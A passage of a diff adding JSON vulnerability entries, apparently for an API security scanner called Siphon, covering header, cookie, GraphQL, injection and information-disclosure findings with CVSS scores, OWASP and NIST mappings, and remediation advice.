+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    "description": "The API response includes an X-Content-Type-Options header with an invalid or non-standard value rather than the required 'nosniff'. A header value other than 'nosniff' does not prevent MIME-type sniffing in browsers and provides no protection against attacks that exploit browsers executing incorrectly typed content (e.g., a JSON file with executable JavaScript content being sniffed and executed as text/html).",
+    "remediation": "Set the X-Content-Type-Options header to exactly 'nosniff' on all API responses. This is a binary setting \u2014 only 'nosniff' is valid. Ensure the correct Content-Type header is also set on all responses to prevent browsers from needing to sniff the content type.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-026",
+    "title": "Permissive Security Header: Referrer-Policy",
+    "severity": "LOW",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SC-8"
+    ],
+    "cves": [],
+    "cvss_score": 2.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "description": "The API response includes a Referrer-Policy header set to an overly permissive value such as 'unsafe-url' or 'no-referrer-when-downgrade'. These values cause the browser to send the full URL (including query parameters, authentication tokens, or session identifiers embedded in URLs) as the Referrer header to third-party domains. This can lead to sensitive data leakage to analytics providers, CDNs, or any third-party resource loaded by the page.",
+    "remediation": "Set Referrer-Policy to 'strict-origin-when-cross-origin' or 'no-referrer' depending on business requirements. Avoid 'unsafe-url' in all cases. For API endpoints that do not serve HTML, set the Referrer-Policy to 'no-referrer'. Ensure that sensitive information such as tokens or session IDs are never included in URLs.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-027",
+    "title": "Permissive Security Header: Cache-Control",
+    "severity": "LOW",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SC-28"
+    ],
+    "cves": [],
+    "cvss_score": 3.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "description": "The API response includes a Cache-Control header, but it allows caching of potentially sensitive responses. For example, the value may be missing 'no-store', or may allow public proxies to cache authenticated responses via 'public' or 'max-age' directives without 'private'. Sensitive API responses cached by intermediary proxies, CDNs, or shared caches can be accessed by other users or attackers with access to those caches.",
+    "remediation": "For authenticated or sensitive API responses, set Cache-Control to 'no-store, private' to prevent caching at all levels. For public, non-sensitive responses, use appropriate 'public' and 'max-age' directives. Review all endpoints that return user-specific data and ensure their Cache-Control headers prevent intermediate caching.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-028",
+    "title": "Missing Secure Cookie Attribute: SameSite",
+    "severity": "LOW",
+    "category": "Session Management",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-23"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "description": "An API session cookie does not include the SameSite attribute. Without SameSite, the browser will send the cookie on all cross-site requests, including those initiated by attacker-controlled third-party sites. This enables Cross-Site Request Forgery (CSRF) attacks where an attacker can cause authenticated actions to be performed without the user's knowledge. While REST APIs using Authorization headers are generally not susceptible to CSRF, cookie-based API authentication without SameSite is vulnerable.",
+    "remediation": "Set the SameSite attribute to 'Lax' as a minimum, or 'Strict' for sensitive cookies such as session tokens. 'None' should only be used when cross-site cookie sending is explicitly required, and must be paired with the Secure attribute. Evaluate whether cookie-based authentication is appropriate for the API, or whether Authorization headers should be used instead.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-029",
+    "title": "Misconfigured Secure Cookie Attribute: SameSite",
+    "severity": "LOW",
+    "category": "Session Management",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-23"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "description": "An API session cookie includes the SameSite attribute but it is set to 'None' without a legitimate cross-site requirement, or is set to a value that browsers do not recognize and fall back to treating as SameSite=None. SameSite=None without a strong justification allows cross-site request forgery attacks the same as having no SameSite attribute. This finding also covers cookies where SameSite=None is set without the required Secure flag, which modern browsers will reject entirely.",
+    "remediation": "Audit all cookies with SameSite=None and confirm each has a documented business requirement for cross-site access. Ensure SameSite=None is always paired with the Secure attribute. Where cross-site access is not required, change SameSite to 'Lax' or 'Strict'. Remove any unrecognized or typo'd SameSite values.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-030",
+    "title": "API Specification Exposed",
+    "severity": "MEDIUM",
+    "category": "Information Disclosure",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7",
+      "AC-3"
+    ],
+    "cves": [],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API's OpenAPI/Swagger specification or equivalent documentation is publicly accessible without authentication (e.g., at /swagger.json, /openapi.json, /api-docs, /swagger-ui.html). The specification reveals the complete API surface including all endpoints, parameter names and types, authentication schemes, and response schemas. This dramatically reduces the reconnaissance effort required for an attacker, providing a complete blueprint of the API without any prior knowledge.",
+    "remediation": "Restrict access to API specification endpoints using authentication. At minimum, require valid credentials to access /swagger-ui, /openapi.json, and related documentation paths. In production environments, consider completely removing public API documentation and limiting it to internal networks or developer portals. If public documentation is required, ensure it does not contain internal or sensitive endpoint details.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/",
+      "https://swagger.io/docs/specification/about/",
+      "https://portswigger.net/web-security/api-testing"
+    ]
+  },
+  {
+    "id": "SI-031",
+    "title": "Missing Security Header: Content-Security-Policy",
+    "severity": "MEDIUM",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "description": "The API response does not include a Content-Security-Policy (CSP) header. Without CSP, the browser applies no restrictions on the origins from which scripts, styles, images, and other resources can be loaded, significantly increasing the risk of Cross-Site Scripting (XSS) attacks. A missing CSP means any XSS vulnerability in the API's responses can result in arbitrary script execution without any browser-level mitigation.",
+    "remediation": "Implement a Content-Security-Policy header on all HTTP responses that return HTML content. Start with a restrictive policy such as \"default-src 'self'\" and gradually expand based on application requirements. Use CSP reporting (report-to or report-uri) to identify violations before enforcing. For pure JSON API endpoints, set CSP to \"default-src 'none'\" as those endpoints should never load external resources.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-032",
+    "title": "Missing Security Header: X-Frame-Options",
+    "severity": "MEDIUM",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    "description": "The API response does not include an X-Frame-Options header and the Content-Security-Policy header does not include a frame-ancestors directive. Without this protection, the API's responses can be embedded in iframes on attacker-controlled websites, enabling UI redress (clickjacking) attacks. An attacker can overlay invisible or transparent frames over legitimate UI elements to trick users into performing unintended authenticated actions.",
+    "remediation": "Add 'X-Frame-Options: DENY' to all API responses, or use the more modern Content-Security-Policy 'frame-ancestors' directive (e.g., \"frame-ancestors 'none'\"). For APIs that legitimately need to be framed by the same origin, use SAMEORIGIN. Prefer the CSP approach as it supports more granular control and is the modern standard.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-033",
+    "title": "Missing Security Header: X-Content-Type-Options",
+    "severity": "MEDIUM",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    "description": "The API response does not include an X-Content-Type-Options: nosniff header. Without this header, browsers may perform MIME-type sniffing and interpret responses as a different content type than declared. For example, a JSON response containing JavaScript could be executed as a script in certain browser configurations. This attack vector is particularly relevant for APIs that accept and reflect user-supplied content.",
+    "remediation": "Add 'X-Content-Type-Options: nosniff' to all API HTTP responses. Ensure all responses also include accurate Content-Type headers matching the actual content. This single-directive header is trivial to implement and should be applied globally via middleware or the web server configuration.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-034",
+    "title": "Missing Security Header: Referrer-Policy",
+    "severity": "MEDIUM",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SC-8"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "description": "The API response does not include a Referrer-Policy header. Without this header, the browser defaults to 'no-referrer-when-downgrade' behavior, sending the full URL as the Referrer header to any HTTPS destination when navigating from HTTPS pages. If API request URLs contain sensitive parameters such as session tokens, API keys, or user identifiers, these values will be leaked to third-party analytics services, CDNs, or any embedded resources loaded by the page.",
+    "remediation": "Add a Referrer-Policy header to all API responses. Set the value to 'strict-origin-when-cross-origin' as a sensible default for most applications, or 'no-referrer' for endpoints that should not leak any referrer information. Ensure sensitive data is never embedded in URLs where it could be exposed in the Referer header.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-035",
+    "title": "Missing Security Header: Cache-Control",
+    "severity": "MEDIUM",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SC-28"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API response for a sensitive or authenticated endpoint does not include a Cache-Control header. Without explicit cache control directives, the response may be cached by intermediate proxies, CDN edge nodes, shared corporate caches, or the client browser. Sensitive API responses (e.g., user profiles, account data, payment information) cached in shared environments can be retrieved by other users, creating a data confidentiality risk.",
+    "remediation": "Add Cache-Control headers to all authenticated or sensitive API responses. Use 'no-store, private' to prevent caching at all levels for sensitive responses. Use 'no-cache' if validation is acceptable but indefinite caching is not. Ensure that any CDN or reverse proxy in front of the API is configured to respect these directives.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-036",
+    "title": "Missing Security Header: Permissions-Policy",
+    "severity": "MEDIUM",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "description": "The API response does not include a Permissions-Policy header (formerly Feature-Policy). Without this header, the browser grants default access to powerful browser features such as camera, microphone, geolocation, payment, and USB for any content rendered from this origin, including third-party iframes. Malicious scripts or XSS payloads executing in the context of this origin can access these features without restriction.",
+    "remediation": "Add a Permissions-Policy header to restrict access to browser features to only those the application requires. Use a restrictive default such as 'camera=(), microphone=(), geolocation=(), payment=()' and selectively enable features as needed. This header provides defense-in-depth against XSS exploitation of browser APIs.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-037",
+    "title": "Missing Secure Cookie Attribute: HttpOnly",
+    "severity": "MEDIUM",
+    "category": "Session Management",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-23"
+    ],
+    "cves": [],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "description": "An API session or authentication cookie is set without the HttpOnly attribute. Without HttpOnly, client-side JavaScript can read the cookie value via document.cookie, enabling session hijacking through Cross-Site Scripting (XSS) attacks. An attacker who successfully injects a script into the application can exfiltrate the session cookie and impersonate the victim without any further interaction.",
+    "remediation": "Set the HttpOnly flag on all session and authentication cookies. This prevents JavaScript from accessing the cookie value while still allowing it to be sent on HTTP requests. Evaluate whether cookie-based authentication is appropriate for the API use case; Authorization headers are generally preferred for API clients as they cannot be stolen via XSS in the same way.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-038",
+    "title": "Missing Secure Cookie Attribute: Secure",
+    "severity": "MEDIUM",
+    "category": "Session Management",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-8",
+      "SC-23"
+    ],
+    "cves": [],
+    "cvss_score": 5.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "description": "An API session or authentication cookie is set without the Secure attribute. Without the Secure flag, the browser will transmit the cookie over unencrypted HTTP connections in addition to HTTPS. An attacker performing a network man-in-the-middle attack (e.g., on an unencrypted Wi-Fi network) can intercept the session cookie and use it to impersonate the authenticated user. This is particularly critical for authentication tokens.",
+    "remediation": "Set the Secure flag on all session and authentication cookies. This ensures the cookie is only transmitted over HTTPS connections. Combine with HSTS to prevent the browser from making HTTP requests to the API at all. If HTTP access is still required for any reason, ensure no sensitive cookies are set on HTTP responses.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-039",
+    "title": "Rate Limit Response Missing Retry-After Header",
+    "severity": "MEDIUM",
+    "category": "Rate Limiting",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "description": "The API returns a 429 Too Many Requests response when rate limits are exceeded, but does not include a Retry-After header indicating when the client should retry. Without Retry-After, clients implementing retry logic may immediately retry requests, causing a thundering herd effect that amplifies load on the server. Additionally, the absence of this header makes the rate limiting behavior opaque, which can assist attackers in tuning their request timing to avoid detection.",
+    "remediation": "Include a Retry-After header (or X-RateLimit-Reset) in all 429 responses, specifying either a date/time or number of seconds until the rate limit window resets. Document the rate limiting behavior in the API specification. Consider also returning X-RateLimit-Limit and X-RateLimit-Remaining headers on successful responses to help clients self-regulate.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Retry-After",
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
+      "https://www.rfc-editor.org/rfc/rfc6585#section-4"
+    ]
+  },
+  {
+    "id": "SI-040",
+    "title": "CRLF Injection in API Parameter",
+    "severity": "MEDIUM",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "description": "Siphon detected that an API parameter containing CRLF sequences (\\r\\n, %0d%0a) is reflected in HTTP response headers without sanitization. CRLF injection allows an attacker to inject arbitrary HTTP headers into the response, enabling header injection attacks, response splitting, cookie injection, cache poisoning, and cross-site scripting via injected Location or Set-Cookie headers. The impact depends on how the injected content is processed by downstream proxies and browsers.",
+    "remediation": "Sanitize all user-supplied input before including it in HTTP response headers by stripping or encoding CR (\\r) and LF (\\n) characters. Use framework-provided header-setting APIs rather than constructing headers manually. Implement output encoding appropriate to the context. Validate that header values conform to expected formats using allowlist validation.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/11-Client-Side_Testing/04-Testing_for_Client-Side_URL_Redirect",
+      "https://portswigger.net/web-security/request-smuggling",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-041",
+    "title": "Log Injection via User-Agent / Query Parameter",
+    "severity": "MEDIUM",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "AU-9",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "description": "Siphon detected that user-controlled input (User-Agent header or query parameters) is written to application logs without sanitization. An attacker can inject newline characters and fake log entries to forge log records, obfuscate malicious activity, or confuse log analysis tools. In systems where logs are consumed by downstream parsers or SIEM tools, injected log entries can trigger false alerts or suppress real ones. If logs are displayed in a web-based log viewer, log injection can escalate to stored XSS.",
+    "remediation": "Sanitize all user-controlled values before writing them to logs by encoding or stripping newline characters, control characters, and HTML special characters. Use structured logging (JSON or similar) rather than free-form string concatenation so injected newlines cannot create new log entries. Apply input validation on User-Agent and other headers before logging.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-042",
+    "title": "SOAP Verbose Fault / Error Disclosure",
+    "severity": "MEDIUM",
+    "category": "Information Disclosure",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SI-11"
+    ],
+    "cves": [],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The SOAP API returns verbose fault messages that disclose internal details such as stack traces, server-side file paths, class names, database connection strings, SQL query fragments, or XML schema structures. Verbose SOAP faults provide an attacker with detailed knowledge of the internal architecture that significantly aids in crafting targeted exploitation attempts. This information leakage is particularly valuable for injection attack reconnaissance.",
+    "remediation": "Configure the SOAP framework to return generic, client-safe fault messages in production environments. Disable stack trace inclusion in fault detail elements. Log detailed error information server-side rather than returning it to clients. Implement a custom fault handler that maps internal exceptions to generic error codes. Regularly test error conditions to verify no sensitive data is disclosed.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-043",
+    "title": "GraphQL Field Suggestions Enabled",
+    "severity": "MEDIUM",
+    "category": "GraphQL Security",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The GraphQL API returns field suggestion messages (e.g., \"Did you mean 'password'?\") when a queried field name is similar to an existing field. This behavior exposes the schema's field names even when introspection is disabled, allowing an attacker to enumerate object types and field names by submitting deliberately misspelled queries and observing the suggestions in error responses. This effectively bypasses introspection-based schema hiding.",
+    "remediation": "Disable field suggestions in the GraphQL engine configuration. In Apollo Server, set 'hideSchemaErrors: true' or use a custom error formatter to remove suggestion strings from error responses. In other frameworks, configure the error masking/formatting to strip suggestion messages. Do not rely on disabling introspection alone as a schema protection measure if field suggestions are still enabled.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "https://portswigger.net/web-security/graphql",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-044",
+    "title": "GraphQL Error Response Leaks Internal Details",
+    "severity": "MEDIUM",
+    "category": "GraphQL Security",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SI-11"
+    ],
+    "cves": [],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "GraphQL error responses from this API expose internal implementation details including stack traces, resolver function names, database query details, file system paths, or internal type names. These details assist an attacker in mapping the internal architecture, identifying the database technology, and crafting targeted injection payloads. Error detail leakage in GraphQL APIs is common when development-mode error handling is left enabled in production deployments.",
+    "remediation": "Configure the GraphQL server to mask internal error details in production. Return only generic error messages with client-safe error codes. Log complete error details server-side for debugging. In Apollo Server, set 'includeStacktraceInErrorResponses: false'. Implement a custom error formatter that strips extensions.exception.stacktrace and other internal fields from error responses.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "https://www.apollographql.com/docs/apollo-server/data/errors/",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-045",
+    "title": "GraphQL Directive Abuse \u2014 Accepted Without Limit",
+    "severity": "MEDIUM",
+    "category": "GraphQL Security",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "description": "The GraphQL API accepts queries containing multiple repeated directives (e.g., @include, @skip, or custom directives) on the same field without limit. Attackers can abuse this by submitting queries with thousands of directive applications on a single field, causing excessive server-side processing to evaluate each directive. This is a form of denial-of-service attack that does not require a large query document and may not be caught by query complexity or depth limits.",
+    "remediation": "Implement directive count validation in the GraphQL query parser to limit the number of directives per field and per query. Set a maximum directive application limit (e.g., no more than 10 directives per field). Use a query cost analysis library that accounts for directive evaluation cost. Apply rate limiting on the GraphQL endpoint.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/"
+    ]
+  },
+  {
+    "id": "SI-046",
+    "title": "GraphQL Fragment Sprawl \u2014 No Fragment Count Limit",
+    "severity": "MEDIUM",
+    "category": "GraphQL Security",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "description": "The GraphQL API accepts queries containing an unrestricted number of fragment definitions. An attacker can define hundreds or thousands of fragments that cyclically reference each other or are applied across many fields, causing the server to perform excessive work during query validation and execution. Fragment sprawl attacks can bypass depth limit protections because fragments flatten the tree before depth counting. This can result in CPU exhaustion and denial-of-service conditions.",
+    "remediation": "Implement fragment count limits in the GraphQL query validator (e.g., maximum 50 fragment definitions per query). Apply a query complexity analysis library that correctly accounts for inline and spread fragments when calculating query cost. Enable query timeout limits. Detect and reject queries containing circular fragment references.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/"
+    ]
+  },
+  {
+    "id": "SI-047",
+    "title": "JSONP Endpoint Detected \u2014 Potential Data Leakage",
+    "severity": "MEDIUM",
+    "category": "Information Disclosure",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "AC-3",
+      "SC-8"
+    ],
+    "cves": [],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "description": "Siphon detected an API endpoint that supports JSONP (JSON with Padding), indicated by a callback parameter that wraps the response in a JavaScript function call. JSONP bypasses Same-Origin Policy using a script tag, enabling cross-origin data access. Authenticated JSONP endpoints are particularly dangerous because an attacker-controlled page can include a script tag pointing to the JSONP endpoint, and if the victim's browser sends session cookies, the attacker receives the victim's data in the callback. JSONP is a legacy pattern that has been superseded by CORS.",
+    "remediation": "Remove JSONP support and replace with proper CORS configuration that specifies allowed origins explicitly. If JSONP must be maintained for legacy compatibility, ensure authenticated JSONP endpoints validate the Referer header and implement CSRF tokens. Restrict the callback parameter to an allowlist of safe function names. Consider this a critical finding on any endpoint that returns user-specific data.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions",
+      "https://owasp.org/www-community/attacks/JSONP_Hijacking",
